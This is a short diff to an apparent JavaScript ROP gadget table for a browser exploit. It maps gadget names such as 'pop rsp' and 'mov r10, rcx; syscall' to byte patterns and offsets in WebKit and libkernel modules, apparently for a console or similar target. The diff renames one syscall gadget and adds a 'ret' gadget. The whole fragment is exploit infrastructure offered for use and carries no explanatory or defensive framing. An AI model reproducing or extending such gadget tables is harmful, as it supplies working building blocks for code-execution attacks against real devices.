@@ -9,7 +9,7 @@ var gadgets = {
 	"pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x2bfe89),
 	"pop rsp": new gadget([0xf3, 0x5c], WEBKIT2, 0x5fbb5),
 	
-	"mov r10, rcx and syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x457),
+	"mov r10, rcx; syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x457),
 	
 	"mov [rax+0x1e8], rdx": new gadget([0x48, 0x89, 0x90, 0xe8, 0x01, 0x00, 0x00], LIBKERNEL, 0x1622),
 	"mov [rax+0x60], rdi": new gadget([0x48, 0x89, 0x78, 0x60], WEBKIT2, 0x2b7274),
@@ -70,4 +70,6 @@ var gadgets = {
 	"jmp rbx": new gadget([], LIBKERNEL, 0x26ac7),
 	"jmp rcx": new gadget([], LIBKERNEL, 0xb9c6),
 	"jmp rdx": new gadget([], LIBKERNEL, 0x666d),
+	
+	"ret": new gadget([], WEBKIT2, 0x52c04c),
 }
